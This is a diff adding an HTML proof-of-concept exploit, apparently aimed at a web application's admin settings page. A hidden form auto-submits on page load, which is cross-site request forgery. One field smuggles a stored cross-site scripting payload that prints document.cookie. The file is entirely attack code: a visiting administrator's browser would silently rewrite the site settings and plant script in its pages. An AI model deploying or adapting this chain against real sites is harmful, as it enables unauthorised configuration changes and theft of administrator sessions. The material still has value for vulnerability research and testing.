@@ -1,0 +1,14 @@
+&lt;form action=&quot;http://www.example.com/admin/admin.php?action=settings&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;site title&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;admin_mail&quot; value=&quot;example@example.com&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;keywords&quot; value=&quot;&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;description&quot; value=&#039;descr&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;site_url&quot; value=&quot;http://www.example.com/&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;seo_url&quot; value=&quot;0&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;mailing&quot; value=&quot;1&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;template&quot; value=&quot;templates/default&quot; /&gt;
+	&lt;input id=&quot;sbmt&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Valider&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.getElementById(&#039;sbmt&#039;).click();
+&lt;/script&gt;
